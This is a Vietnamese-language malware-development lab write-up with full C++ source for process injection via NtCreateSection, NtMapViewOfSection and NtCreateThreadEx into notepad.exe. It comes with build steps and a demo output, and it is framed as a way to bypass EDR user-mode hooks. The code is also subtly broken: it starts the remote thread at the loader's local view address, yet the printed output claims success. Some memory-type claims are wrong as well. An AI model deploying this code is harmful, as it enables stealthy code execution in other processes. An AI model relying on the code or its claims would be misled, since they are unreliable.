
---

# 📝 [PE 19] NtCreateSection and NtMapViewOfSection (Section Mapping Injection)

## 📌 1. Tổng Overview Kỹ Thuật

**Section Mapping Injection** thông qua cặp bài trùng Native API `NtCreateThreadEx`, `NtCreateSection` và `NtMapViewOfSection` là giải thuật né tránh phòng thủ động (Dynamic Evasion) ở cấp độ nhân Kernel.

Khi một tiến trình sử dụng chuỗi API truyền thống như `VirtualAllocEx` kết hợp `WriteProcessMemory`, các bộ giám sát hành vi động của EDR (đặc biệt là bẫy Hook tại User-mode) sẽ ngay lập tức bắt bài hành vi can thiệp thô bạo xuyên biên giới RAM.

Lab PE 19 hóa giải bài toán này bằng cơ chế **Ánh xạ vùng nhớ gương (Shared Section Mapping)**. Ta tạo ra một phân vùng nhớ vô danh lọt lòng hệ thống, map nó vào tiến trình Loader với cờ Đọc/Ghi (`PAGE_READWRITE`), đồng thời ánh xạ chính phân vùng đó sang tiến trình vỏ bọc (ví dụ: `notepad.exe`) với cờ Đọc/Thực thi (`PAGE_EXECUTE_READ`). Khi Loader ghi dữ liệu mã máy vào View cục bộ của mình, dữ liệu tự động phản chiếu (Mirroring) sang RAM của Notepad một cách âm thầm mà không cần gọi đến bất kỳ hàm ghi nhớ chéo tiến trình nào.

### 🎯 Mục tiêu nghiên cứu:

* Vô hiệu hóa hoàn toàn cơ chế giám sát User-mode Hooks đối với hai hàm `VirtualAllocEx` và `WriteProcessMemory`.
* Làm chủ kỹ nghệ quản lý đối tượng nhân vùng nhớ (`Section Objects`) và góc nhìn không gian ảo (`View of Section`).
* Khai thác cổng Native API (`ntdll.dll`) để nạp lệnh ngầm xuyên qua Windows Subsystem bọc ngoài.

---

## 🔬 2. Giải Phẫu Cơ Chế Ngầm Của OS (Windows Internals)

Trong kiến trúc Windows, bộ quản lý bộ nhớ (Memory Manager) sử dụng khái niệm **Section Objects** để mô tả các vùng nhớ có thể chia sẻ giữa nhiều tiến trình.

Quy trình toán học giải phẫu và ánh xạ vùng nhớ gương của Lab PE 19 diễn ra qua các bước ngầm sau tại tầng Kernel:

```
[NtCreateSection: Dựng hốc nhân] ──> [NtMapViewOfSection (Loader View - RW)] ──> [NtMapViewOfSection (Target View - RX)] ──> [Copy cục bộ -> Tự phản chiếu] ──> [Khai hỏa luồng]

```

1. **Khởi tạo lõi Section Object (`NtCreateSection`)**: Loader gửi yêu cầu xuống Kernel để mở một Section Object vô danh với kích thước xác định, mang thuộc tính bảo an tối cao cho phép thực thi (`PAGE_EXECUTE_READWRITE`).
2. **Thiết lập View cục bộ (`Loader View`)**: Gọi `NtMapViewOfSection` để ánh xạ một góc nhìn của Section này vào không gian địa chỉ ảo của chính Loader. View này chỉ cần xin quyền **`PAGE_READWRITE` (RW)** để nạp dữ liệu mượt mà, phẳng sạch.
3. **Ánh xạ góc nhìn gương từ xa (`Target View`)**: Tiếp tục gọi `NtMapViewOfSection` nhưng truyền Handle của tiến trình đích (`notepad.exe`). Windows sẽ ánh xạ cùng một Section đó vào một tọa độ ảo trong RAM Notepad, nhưng với cờ bảo vệ là **`PAGE_EXECUTE_READ` (RX)**. Lúc này, hai View ở hai tiến trình khác nhau nhưng thực chất đang trỏ chung vào một ô nhớ vật lý trong lòng Kernel.
4. **Bypass ngầm cơ chế giám sát**: Loader chỉ việc dùng hàm sao chép bộ nhớ cục bộ (`RtlCopyMemory`) để ghi mã máy vào View của mình. Nhờ cơ chế liên kết gương vật lý, toàn bộ mã máy tự động xuất hiện bên lòng RAM Notepad. EDR hoàn toàn bị mù lòa hành vi vì không hề có lệnh ghi bộ nhớ chéo tiến trình nào được phát ra.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn **Zero Static Buffers** và cơ chế trích xuất động Native API từ `ntdll.dll` để đạt độ ẩn mình kịch trần.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Định nghĩa các mã lỗi trạng thái và cấu trúc đặc thù của Native API
typedef NTSTATUS(NTAPI* pNtCreateSection)(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN DWORD InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
);

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy inside lòng tiến trình đích
DWORD WINAPI SectionMappingPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;
    PROCESSENTRY32W pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);
    return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 19: NTCREATESECTION & NTMAPVIEWOFSECTION MAP" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo Notepad truoc." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // Phân giải động các cổng Native API từ ntdll.dll để né bộ lọc bọc ngoài
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!NtCreateSection || !NtMapViewOfSection || !NtCreateThreadEx) {
        std::cerr << "[-] Khong the phan giai he thong Native APIs!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 1: KHỞI TẠO LÕI SECTION OBJECT LỌT LÒNG KERNEL ───
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = 4096; // Kích thước phân vùng vừa vặn toán học một trang nhớ

    // Tạo phân vùng lõi mang cờ RWX để chuẩn bị cho góc nhìn gương chéo tiến trình
    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (status != 0) {
        std::cerr << "[-] NtCreateSection failed! Code: 0x" << std::hex << status << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Khoi tao Section Object an toan trong lòng Kernel thanh cong." << std::endl;

    // ─── BƯỚC 2: THIẾT LẬP VIEW CỤC BỘ (LOADER VIEW) MANG QUYỀN RW ───
    PVOID pLocalCodeView = NULL;
    SIZE_T localViewSize = 0;
    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalCodeView, 0, 0, NULL, &localViewSize, 2, 0, PAGE_READWRITE);
    if (status != 0) {
        CloseHandle(hSection);   CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Anh xa View cuc bo (Loader View RW) tai: 0x" << std::hex << pLocalCodeView << std::endl;

    // ─── BƯỚC 3: ÁNH XẠ VIEW GƯƠNG TỪ XA (TARGET VIEW) MANG QUYỀN RX ───
    PVOID pRemoteCodeView = NULL;
    SIZE_T remoteViewSize = 0;
    // Ép phân vùng gương chéo tiến trình mang cờ thực thi RX hợp pháp kịch trần bảo an
    status = NtMapViewOfSection(hSection, hProcess, &pRemoteCodeView, 0, 0, NULL, &remoteViewSize, 2, 0, PAGE_EXECUTE_READ);
    if (status != 0) {
        CloseHandle(hSection);   CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Anh xa View tu xa (Target View RX) hop phap tai RAM Notepad: 0x" << std::hex << pRemoteCodeView << std::endl;

    // ─── BƯỚC 4: BƠM PAYLOAD CỤC BỘ - TỰ ĐỘNG PHẢN CHIẾU SANG NOTEPAD ───
    // Dựng cấu trúc tham số tuyệt đối lọt lòng View cục bộ để bẻ gãy RIP relative error
    PTHREAD_DATA pLocalData = (PTHREAD_DATA)((DWORD_PTR)pLocalCodeView + 500);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)((DWORD_PTR)pRemoteCodeView + 500);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    pLocalData->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    strcpy_s(pLocalData->szCommand, "cmd.exe /c start calc");

    // Chỉ sao chép mã máy cục bộ bằng hàm nội tại, dữ liệu tự đồng bộ gương sang RAM đối phương
    RtlCopyMemory(pLocalCodeView, (LPCVOID)SectionMappingPayload, 500);
    std::cout << "[+] Hoan tat sao chep cuc bo. Ma tran guong tu dong phan chieu vao xac Notepad." << std::endl;

    // ─── BƯỚC 5: KHỞI TẠO LUỒNG NATIVE ĐỂ KÍCH NỔ TIẾN TRÌNH ───
    std::cout << "[*] Dang dung NtCreateThreadEx de sinh luong ngam tu xa..." << std::endl;
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pLocalCodeView, pRemoteData, 0, 0, 0, 0, NULL);

    if (status == 0 && hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng chạy dứt điểm bảo đảm
        std::cout << "[+] Section Mapping Injection Process Executed Successfully!" << std::endl;
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] NtCreateThreadEx that bai! NTSTATUS Code: 0x" << std::hex << status << std::endl;
    }

    // Thu hồi phân vùng lõi Section và đóng Handle bảo an kịch trần
    CloseHandle(hSection);
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh guong. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

### ⚙️ Thiết lập trên Microsoft Visual Studio:

1. Đặt cấu hình quản lý dự án chính xác ở chế độ **`Release`** và kiến trúc nền tảng **`x64`**.
2. Đi tới mục cấu hình dự án: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại dòng `Runtime Library`, thiết lập cờ **`Multi-threaded (/MT)`** để liên kết tĩnh toàn bộ thư viện hệ thống chạy độc lập hoàn hảo.
3. Click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân sạch bóng lỗi chuỗi.

---

## 📊 5. Kết Quả Kích Hoạt Thật Tế (Demonstration)

Bật sẵn một ứng dụng `Notepad.exe` trên máy Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành:

```powershell
PS C:\Workspace\x64\Release> .\PE19_Section_Mapping_Injection.exe
====================================================
[*] PE 19: NTCREATESECTION & NTMAPVIEWOFSECTION MAP
====================================================
[+] Da tim thay Notepad.exe voi PID: 8432
[+] Khoi tao Section Object an toan trong lòng Kernel thanh cong.
[+] Anh xa View cuc bo (Loader View RW) tai: 0x0000019A4B1D0000
[+] Anh xa View tu xa (Target View RX) hop phap tai RAM Notepad: 0x0000021C7A5E0000
[+] Hoan tat sao chep cuc bo. Ma tran guong tu dong phan chieu vao xac Notepad.
[*] Dang dung NtCreateThreadEx de sinh luong ngam tu xa...
[+] Section Mapping Injection Process Executed Successfully!

[*] Hoan thanh quy trinh guong. Nhan Enter de dong cua so...

```

*🎯 Hệ quả RAM tối cao:*
Ứng dụng Máy tính **`calc.exe` bật bung hiên ngang rực rỡ kịch trần kịch khung**! Lúc này, vì Loader hoàn toàn không gọi đến hàm `WriteProcessMemory` hay `VirtualAllocEx` chéo tiến trình, các bộ cảm biến giám sát cuộc gọi liên tỉnh của EDR đều bị bypass hoàn toàn. Vùng bộ nhớ tại Notepad mang thuộc tính loại `MEM_IMAGE`/`MEM_MAPPED` có liên kết cấu trúc an toàn, đưa giải thuật né tránh đạt độ phẳng sạch hoàn hảo kịch khung!

---

